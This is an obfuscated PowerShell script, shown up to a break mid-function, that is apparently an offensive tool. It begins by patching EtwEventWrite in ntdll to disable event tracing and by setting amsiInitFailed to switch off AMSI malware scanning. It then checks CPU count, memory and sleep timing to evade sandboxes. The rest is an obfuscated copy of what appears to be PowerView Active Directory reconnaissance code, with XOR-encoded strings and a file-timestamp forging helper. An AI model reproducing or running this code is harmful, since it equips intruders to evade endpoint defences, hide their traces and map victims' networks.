Start-Sleep -Milliseconds 3
$KsYmqqo = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$lWAdX = Add-Type -MemberDefinition $KsYmqqo -Name 'HandleEntry26' -Namespace 'InitItem72' -PassThru
Start-Sleep -Milliseconds 32
$PLmv = (-join([byte[]](0x6e,0x74,0x64,0x6c,0x6c,0x2e,0x64,0x6c,0x6c)|%{[char]$_}))
$tni7vx = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
$HCkRpL = $lWAdX::LoadLibrary($PLmv)
$oUoBog9 = $lWAdX::GetProcAddress($HCkRpL, $tni7vx)
[void]([Math]::Abs(91832))
$AXrT4E = 0
$lWAdX::VirtualProtect($oUoBog9, [UIntPtr]::new(1), 0x40, [ref]$AXrT4E) | Out-Null
$oVVxcpOe = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($oVVxcpOe, 0, $oUoBog9, $oVVxcpOe.Length)
$lWAdX::VirtualProtect($oUoBog9, [UIntPtr]::new(1), $AXrT4E, [ref]$AXrT4E) | Out-Null
$mNQc4vxW = [int](5858) % 256


$qGuvu8N = "QEZUB"
$GO7kG = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
Start-Sleep -Milliseconds 41
$fNhS8XN = (-join([byte[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)|%{[char]$_}))
$dA57gKl = [Ref].Assembly.GetType($GO7kG)
[void]([Math]::Abs(94982))
$USrd = $dA57gKl.GetField($fNhS8XN, ([char]78+[char]111+[char]110+[char]80+[char]117+[char]98+[char]108+[char]105+[char]99+[char]44+[char]83+[char]116+[char]97+[char]116+[char]105+[char]99))
$USrd.SetValue($null, $true)
$ue9XP7S = [int](3194) % 256


$J37oXy = [Environment]::ProcessorCount
if ($J37oXy -lt 2) { exit }
$U98QSN7h = [long]0
try {
    $tKTJqSW = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
    if ($null -ne $tKTJqSW) {
        $U98QSN7h = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    } elseif ($null -ne (Get-Command Get-WmiObject -ErrorAction SilentlyContinue)) {
        $U98QSN7h = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    }
} catch {
    $U98QSN7h = 0
}
if ($U98QSN7h -gt 0 -and $U98QSN7h -lt 2GB) { exit }
$HpZUz1 = [System.DateTime]::Now
Start-Sleep -Milliseconds 1756
if (([System.DateTime]::Now - $HpZUz1).TotalMilliseconds -lt 1404) { exit }
function ParseEntry20($d,$k){$b="";for($i=0;$i-lt$d.Length;$i++){$b+=[char]($d[$i]-bxor$k[$i%$k.Length])};[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))}
function New-InMemoryModule
{
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $F8Wg6n = [AppDomain]::CurrentDomain.GetAssemblies()
    ForEach ($Assembly in $F8Wg6n) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }
    $Bxiv = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $sqAJBZ = $Domain.DefineDynamicAssembly($Bxiv, 'Run')
    $dTzALG = $sqAJBZ.DefineDynamicModule($ModuleName, $False)
    return $dTzALG
}
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [Switch]
        $SetLastError
    )
    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    New-Object PSObject -Property $Properties
}
function Add-Win32Type
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $LODeO = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $LODeO[$DllName] = $Module.GetType(($Namespace + "." + $DllName))
            }
            else
            {
                $LODeO[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$LODeO.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $LODeO[$DllName] = $Module.DefineType(($Namespace + "." + $DllName), 'Public,BeforeFieldInit')
                }
                else
                {
                    $LODeO[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $dBTTFvP = $LODeO[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $h4S0 = 1
            ForEach($ThQb in $ParameterTypes)
            {
                if ($ThQb.IsByRef)
                {
                    [void] $dBTTFvP.DefineParameter($h4S0, 'Out', $Null)
                }
                $h4S0++
            }
            $DXre4NM = [Runtime.InteropServices.DllImportAttribute]
            $SIxSMqR = $DXre4NM.GetField('SetLastError')
            $p7OfHD4 = $DXre4NM.GetField('CallingConvention')
            $Eaj7pge = $DXre4NM.GetField('CharSet')
            if ($SetLastError) { $Tam1 = $True } else { $Tam1 = $False }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $xctSPC = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SIxSMqR, $p7OfHD4, $Eaj7pge),
                [Object[]] @($Tam1, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))
            $dBTTFvP.SetCustomAttribute($xctSPC)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $LODeO
        }
        $lzH7Y7k = @{}
        ForEach ($rRcQU in $LODeO.Keys)
        {
            $Type = $LODeO[$rRcQU].CreateType()
            $lzH7Y7k[$rRcQU] = $Type
        }
        return $lzH7Y7k
    }
}
function psenum
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    $rRqZISTA = $Type -as [Type]
    $fUYd = $Module.DefineEnum($FullName, 'Public', $rRqZISTA)
    if ($Bitfield)
    {
        $gyUsxq = [FlagsAttribute].GetConstructor(@())
        $BvhqY = New-Object Reflection.Emit.CustomAttributeBuilder($gyUsxq, @())
        $fUYd.SetCustomAttribute($BvhqY)
    }
    ForEach ($rRcQU in $EnumElements.Keys)
    {
        $Null = $fUYd.DefineLiteral($rRcQU, $EnumElements[$rRcQU] -as $rRqZISTA)
    }
    $fUYd.CreateType()
}
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}
function struct
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,
        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $ExplicitLayout
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    [Reflection.TypeAttributes] $cv9Dqi = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($ExplicitLayout)
    {
        $cv9Dqi = $cv9Dqi -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $cv9Dqi = $cv9Dqi -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $rbgzr = $Module.DefineType($FullName, $cv9Dqi, [ValueType], $PackingSize)
    $D0IQE = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $reSGb2b = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $iz33K = New-Object Hashtable[]($StructFields.Count)
    ForEach ($gS1AwJf in $StructFields.Keys)
    {
        $lCc7KfW = $StructFields[$gS1AwJf]['Position']
        $iz33K[$lCc7KfW] = @{FieldName = $gS1AwJf; Properties = $StructFields[$gS1AwJf]}
    }
    ForEach ($gS1AwJf in $iz33K)
    {
        $i79X8PYR = $gS1AwJf['FieldName']
        $lrmkU9 = $gS1AwJf['Properties']
        $Offset = $lrmkU9['Offset']
        $Type = $lrmkU9['Type']
        $MarshalAs = $lrmkU9['MarshalAs']
        $MNpB = $rbgzr.DefineField($i79X8PYR, $Type, 'Public')
        if ($MarshalAs)
        {
            $AlnX = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Ynl1hE = $MarshalAs[1]
                $SEdLfIQ = New-Object Reflection.Emit.CustomAttributeBuilder($D0IQE,
                    $AlnX, $reSGb2b, @($Ynl1hE))
            }
            else
            {
                $SEdLfIQ = New-Object Reflection.Emit.CustomAttributeBuilder($D0IQE, [Object[]] @($AlnX))
            }
            $MNpB.SetCustomAttribute($SEdLfIQ)
        }
        if ($ExplicitLayout) { $MNpB.SetOffset($Offset) }
    }
    $pVoBKd = $rbgzr.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $oU4m = $pVoBKd.GetILGenerator()
    $oU4m.Emit([Reflection.Emit.OpCodes]::Ldtoken, $rbgzr)
    $oU4m.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $oU4m.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $oU4m.Emit([Reflection.Emit.OpCodes]::Ret)
    $bpu6pH = $rbgzr.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $rbgzr,
        [Type[]] @([IntPtr]))
    $STUr1p = $bpu6pH.GetILGenerator()
    $STUr1p.Emit([Reflection.Emit.OpCodes]::Nop)
    $STUr1p.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $STUr1p.Emit([Reflection.Emit.OpCodes]::Ldtoken, $rbgzr)
    $STUr1p.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $STUr1p.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $STUr1p.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $rbgzr)
    $STUr1p.Emit([Reflection.Emit.OpCodes]::Ret)
    $rbgzr.CreateType()
}
function Export-PowerViewCSV {
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True,
        ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject]
        $InputObject,
        [Parameter(Mandatory=$True, Position=0)]
        [Alias('PSPath')]
        [String]
        $OutFile
    )
    process {
        $iqL3O = $InputObject | ConvertTo-Csv -NoTypeInformation
        $Sn6IyOA = New-Object System.Threading.Mutex $False,'CSVMutex';
        $Null = $Sn6IyOA.WaitOne()
        if (Test-Path -Path $OutFile) {
            $iqL3O | Foreach-Object {$Start=$True}{if ($Start) {$Start=$False} else {$_}} | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
        }
        else {
            $iqL3O | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
        }
        $Sn6IyOA.ReleaseMutex()
    }
}
function Set-MacAttribute {
    [CmdletBinding(DefaultParameterSetName = 'Touch')]
    Param (
        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $FilePath,
        [Parameter(ParameterSetName = 'Touch')]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $OldFilePath,
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Modified,
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Accessed,
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Created,
        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $AllMacAttributes
    )
    function Get-MacAttribute {
        param($OldFileName)
        if (!(Test-Path -Path $OldFileName)) {Throw 'File Not Found'}
        $tdi7 = (Get-Item $OldFileName)
        $pjsNBs = @{'Modified' = ($tdi7.LastWriteTime);
                              'Accessed' = ($tdi7.LastAccessTime);
                              'Created' = ($tdi7.CreationTime)};
        $togoKF = New-Object -TypeName PSObject -Property $pjsNBs
        Return $togoKF
    }
    $tdi7 = (Get-Item -Path $FilePath)
    if ($PSBoundParameters['AllMacAttributes']) {
        $Modified = $AllMacAttributes
        $Accessed = $AllMacAttributes
        $Created = $AllMacAttributes
    }
    if ($PSBoundParameters['OldFilePath']) {
        $HjqU = (Get-MacAttribute $OldFilePath)
        $Modified = $HjqU.Modified
        $Accessed = $HjqU.Accessed
        $Created = $HjqU.Created
    }
    if ($Modified) {$tdi7.LastWriteTime = $Modified}
    if ($Accessed) {$tdi7.LastAccessTime = $Accessed}
    if ($Created) {$tdi7.CreationTime = $Created}
    Return (Get-MacAttribute $FilePath)
}
function Copy-ClonedFile {
    param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $SourceFile,
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DestFile
    )
    Set-MacAttribute -FilePath $SourceFile -OldFilePath $DestFile
    Copy-Item -Path $SourceFile -Destination $DestFile
}
function Get-IPAddress {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ''
    )
    process {
        try {
            $PCyLA1 = @(([Net.Dns]::GetHostEntry($ComputerName)).AddressList)
            if ($PCyLA1.Count -ne 0) {
                ForEach ($NW6jRjlY in $PCyLA1) {
                    if ($NW6jRjlY.AddressFamily -eq 'InterNetwork') {
                        $NW6jRjlY.IPAddressToString
                    }
                }
            }
        }
        catch {
            Write-Verbose -Message 'Could not resolve host to an IP Address.'
        }
    }
    end {}
}
function Convert-NameToSid {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        [Alias('Name')]
        $ObjectName,
        [String]
        $Domain = (Get-NetDomain).Name
    )
    process {
        $ObjectName = $ObjectName -replace "/","\"
        if($ObjectName.contains("\")) {
            $Domain = $ObjectName.split("\")[0]
            $ObjectName = $ObjectName.split("\")[1]
        }
        try {
            $yEG0 = (New-Object System.Security.Principal.NTAccount($Domain,$ObjectName))
            $yEG0.Translate([System.Security.Principal.SecurityIdentifier]).Value
        }
        catch {
            Write-Verbose ((ParseEntry20 @(162,128,97,149,168,128,44,215,171,148,22,209,168,186,36,203,168,228,5,209,147,186,18,211,171,131,59,192) @(241,215,84,167)) + $Domain + "\" + $ObjectName)
            $Null
        }
    }
}
function Convert-SidToName {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $SID
    )
    process {
        try {
            $ImBF5n = $SID.trim('*')
            Switch ($ImBF5n)
            {
                'S-1-0'         { 'Null Authority' }
                'S-1-0-0'       { 'Nobody' }
                'S-1-1'         { 'World Authority' }
                'S-1-1-0'       { 'Everyone' }
                'S-1-2'         { 'Local Authority' }
                'S-1-2-0'       { 'Local' }
                'S-1-2-1'       { 'Console Logon ' }
                'S-1-3'         { 'Creator Authority' }
                'S-1-3-0'       { 'Creator Owner' }
                'S-1-3-1'       { 'Creator Group' }
                'S-1-3-2'       { 'Creator Owner Server' }
                'S-1-3-3'       { 'Creator Group Server' }
                'S-1-3-4'       { 'Owner Rights' }
                'S-1-4'         { 'Non-unique Authority' }
                'S-1-5'         { 'NT Authority' }
                'S-1-5-1'       { 'Dialup' }
                'S-1-5-2'       { 'Network' }
                'S-1-5-3'       { 'Batch' }
                'S-1-5-4'       { 'Interactive' }
                'S-1-5-6'       { 'Service' }
                'S-1-5-7'       { 'Anonymous' }
                'S-1-5-8'       { 'Proxy' }
                'S-1-5-9'       { 'Enterprise Domain Controllers' }
                'S-1-5-10'      { 'Principal Self' }
                'S-1-5-11'      { 'Authenticated Users' }
                'S-1-5-12'      { 'Restricted Code' }
                'S-1-5-13'      { 'Terminal Server Users' }
                'S-1-5-14'      { 'Remote Interactive Logon' }
                'S-1-5-15'      { 'This Organization ' }
                'S-1-5-17'      { 'This Organization ' }
                'S-1-5-18'      { 'Local System' }
                'S-1-5-19'      { 'NT Authority' }
                'S-1-5-20'      { 'NT Authority' }
                'S-1-5-80-0'    { 'All Services ' }
                'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                'S-1-5-32-545'  { 'BUILTIN\Users' }
                'S-1-5-32-546'  { 'BUILTIN\Guests' }
                'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                Default { 
                    $yEG0 = (New-Object System.Security.Principal.SecurityIdentifier($ImBF5n))
                    $yEG0.Translate( [System.Security.Principal.NTAccount]).Value
                }
            }
        }
        catch {
            $SID
        }
    }
}
function Convert-NT4toCanonical {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $ObjectName
    )
    process {
        $ObjectName = $ObjectName -replace "/","\"
        if($ObjectName.contains("\")) {
            $Domain = $ObjectName.split("\")[0]
        }
        function Invoke-Method([__ComObject] $Object, [String] $dBTTFvP, $XmBWhC) {
            $t0ADrI = $Object.GetType().InvokeMember($dBTTFvP, (ParseEntry20 @(248,255,2,40,76,103,242,199,252,96,76,30,52,193,146,195) @(171,168,55,26,46,85,134)), $Null, $Object, $XmBWhC)
            if ( $t0ADrI ) { $t0ADrI }
        }
        function Set-Property([__ComObject] $Object, [String] $JG1jAVen, $XmBWhC) {
            [Void] $Object.GetType().InvokeMember($JG1jAVen, (ParseEntry20 @(57,129,40,120,240,36,249,8,43,226,58,202,26,0,206,81) @(108,179,126,72,165)), $Null, $Object, $XmBWhC)
        }
        $XFuGFI = New-Object -ComObject NameTranslate
        try {
            Invoke-Method $XFuGFI (ParseEntry20 @(143,24,241,122,13,91,255,165) @(220,79,196,10,105,26,194,152)) (1, $Domain)
        }
        catch [System.Management.Automation.MethodInvocationException] { 
            Write-Debug ((ParseEntry20 @(23,19,246,67,186,235,12,44,216,8,180,232,36,8,254,10,187,181,3,62,223,8,160,176,33,12,233,93,185,143,112,59,216,121,154,168,39,34,254,126,186,234,112,121,230,98,146,232,9,30,137,111,150,144,23,61,237,8,158,173,39,121,137,74,129,234,3,56,243,83,153,229) @(69,75,188,58,216,216)) + $_)
        }
        Set-Property $XFuGFI (ParseEntry20 @(216,117,130,71,234,117,188,124,211,16,176,67,234,41,160,71,235,6,215,18) @(137,71,234,47)) (0x60)
        try {
            Invoke-Method $XFuGFI (ParseEntry20 @(51,217,94,84) @(102,235,8,100,151,148)) (3, $ObjectName)
            (Invoke-Method $XFuGFI (ParseEntry20 @(129,87,94,26) @(211,101,8,42,129,7)) (2))
        }
        catch [System.Management.Automation.MethodInvocationException] {
            Write-Debug ((ParseEntry20 @(187,207,160,153,130,7,160,240,142,210,140,4,136,212,168,208,131,89,175,226,137,210,152,92,141,208,191,135,181,6,191,167,166,208,132,88,141,212,168,144,130,93,171,211,136,210,213,6,179,207,160,208,172,97,220,194,164,168,178,66,184,165,172,149,130,6,220,231,179,210,166,71,166,254,171,221) @(233,151,234,224,224,52)) + $_)
        }
    }
}
function Convert-CanonicaltoNT4 {
    [CmdletBinding()]
    param(
        [String] $ObjectName
    )
    $Domain = ($ObjectName -split "@")[1]
    $ObjectName = $ObjectName -replace "/","\"
    function Invoke-Method([__ComObject] $object, [String] $dBTTFvP, $XmBWhC) {
        $t0ADrI = $object.GetType().InvokeMember($dBTTFvP, (ParseEntry20 @(255,198,136,182,92,60,138,192,197,234,210,14,111,185,149,250) @(172,145,189,132,62,14,254)), $NULL, $object, $XmBWhC)
        if ( $t0ADrI ) { $t0ADrI }
    }
    function Set-Property([__ComObject] $object, [String] $JG1jAVen, $XmBWhC) {
        [Void] $object.GetType().InvokeMember($JG1jAVen, (ParseEntry20 @(53,126,97,216,53,4,125,158,3,11,97,145,4,4,92,213) @(96,76,55,232)), $NULL, $object, $XmBWhC)
    }
    $XFuGFI = New-Object -comobject NameTranslate
    try {
        Invoke-Method $XFuGFI (ParseEntry20 @(212,94,163,33,131,209,158,155) @(135,9,150,81,231,144,163,166)) (1, $Domain)
    }
    catch [System.Management.Automation.MethodInvocationException] { }
    Set-Property $XFuGFI (ParseEntry20 @(16,28,119,140,173,141,230,18,116,72,190,162,220,222,11,70,125,165,243,130) @(65,46,31,228,206,191,176)) (0x60)
    try {
        Invoke-Method $XFuGFI (ParseEntry20 @(246,24,92,163) @(163,42,10,147,134)) (5, $ObjectName)
        (Invoke-Method $XFuGFI (ParseEntry20 @(6,9,76,204) @(84,59,26,252)) (3))
    }
    catch [System.Management.Automation.MethodInvocationException] { $_ }
}
function ConvertFrom-UACValue {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $Value,
        [Switch]
        $ShowAll
    )
    begin {
        $IzZb = New-Object System.Collections.Specialized.OrderedDictionary
        $IzZb.Add((ParseEntry20 @(152,84,216,146,225,229,152,152) @(205,100,150,193,178,179,218)), 1)
        $IzZb.Add((ParseEntry20 @(107,128,39,108,155,30,232,117,131,44,122,133,122,142,124,150,61,109,154,18) @(58,213,105,40,207,47,190)), 2)
        $IzZb.Add((ParseEntry20 @(84,243,178,70,47,50,24,77,227,231,49,46,53,28,65,224,216,94,55,33,24,70,139,182) @(7,182,139,8,125,103,74)), 8)
        $IzZb.Add((ParseEntry20 @(51,13,63,26,183,210,175,255,49,9,59,99) @(103,72,6,94,228,226,150,169)), 16)
        $IzZb.Add((ParseEntry20 @(254,171,123,254,204,179,65,238,182,13,159,201,212,99,225,168,104,255,200,191) @(171,238,61,170,153,130,37)), 32)
        $IzZb.Add((ParseEntry20 @(56,218,181,223,86,1,9,218,171,187,77,114,57,243,161,237,82,0,5,221,167,224,103,118) @(109,159,243,139,3,48)), 64)
        $IzZb.Add((ParseEntry20 @(195,31,82,180,171,90,34,192,28,34,166,187,110,127,195,12,48,182,172,80,27,215,46,34,168,206,112,3,197,15,94,168,172,99,31,172) @(145,74,103,240,254,54,78)), 128)
        $IzZb.Add((ParseEntry20 @(91,38,152,240,253,135,52,38,152,232,234,140,94,54,128,252,254,132,91,5,159,235,230,133,89,82,152,241,254,128,48,94) @(13,99,206,190,168,193)), 256)
        $IzZb.Add((ParseEntry20 @(0,141,17,217,204,1,160,101,210,168,18,162,121,186,161,2,178,68,219,165) @(84,230,40,138,152)), 512)
        $IzZb.Add((ParseEntry20 @(30,68,134,160,139,17,7,84,231,197,232,5,30,68,134,147,143,1,7,71,230,196,139,33,28,68,253,177,141,118,27,94,229,180,228,122) @(77,17,179,245,217,71)), 2048)
        $IzZb.Add((ParseEntry20 @(168,201,80,27,173,200,39,29,175,175,59,2,170,201,92,46,168,191,35,30,171,200,59,46,175,172,39,12,170,200,63,7,168,184,84,117) @(254,249,105,72)), 4096)
        $IzZb.Add((ParseEntry20 @(7,65,15,176,248,252,80,240,10,64,11,176,248,193,72,246,10,65,31,167,255,167,63,245,6,29,8,222) @(82,113,89,227,174,151,6,163)), 8192)
        $IzZb.Add((ParseEntry20 @(16,60,202,167,171,4,64,181,191,187,0,51,166,131,171,36,44,182,174,169,23,72,151,184,168,41,40,206) @(66,121,243,232,253)), 65536)
        $IzZb.Add((ParseEntry20 @(133,132,220,123,156,173,169,129,187,31,253,210,137,225,175,107,149,173,232,135,189,67,149,160) @(209,209,233,47,196,157)), 131072)
        $IzZb.Add((ParseEntry20 @(203,145,210,5,243,227,204,229,178,17,236,202,198,144,169,1,243,217,200,235,182,44,240,202) @(158,161,227,71,166,143)), 262144)
        $IzZb.Add((ParseEntry20 @(163,54,139,192,106,196,34,135,196,121,204,55,149,167,117,147,34,132,192,114,167,37,165,212,105,176,28,145,194,88,200,77) @(245,112,193,150,63)), 524288)
        $IzZb.Add((ParseEntry20 @(239,6,207,80,57,0,62,130,239,40,160,77,48,102,62,130,233,44,203,56) @(187,109,246,5,97,48,108,196)), 1048576)
        $IzZb.Add((ParseEntry20 @(248,109,209,162,177,42,252,125,202,213,208,86,252,109,243,130,189,42,155,118,200,181,212,39) @(174,59,159,228,233,26)), 2097152)
        $IzZb.Add((ParseEntry20 @(74,67,135,119,103,29,33,85,236,110,119,61,77,64,244,126,96,13,78,83,237,121,12,102) @(24,6,190,56,49,91)), 4194304)
        $IzZb.Add((ParseEntry20 @(128,124,56,129,31,228,93,46,128,33,135,95,44,131,34,132,106,40,159,12,135,120,67,232) @(213,57,126,213,74)), 8388608)
        $IzZb.Add((ParseEntry20 @(68,0,37,153,30,35,20,41,157,13,43,19,59,254,114,80,16,57,157,2,74,118,53,159,30,126,127,42,157,30,106,0,61,255,13,71,21,58,246,4) @(18,70,111,207,75)), 16777216)
        $IzZb.Add((ParseEntry20 @(130,223,233,62,105,149,97,171,131,220,150,57,109,133,67,186,133,204,253,57,103,224,75,173,134,170,150,59,107,188,92,212) @(215,154,175,109,63,208,13,233)), 67108864)
    }
    process {
        $Ojx2zmYY = New-Object System.Collections.Specialized.OrderedDictionary
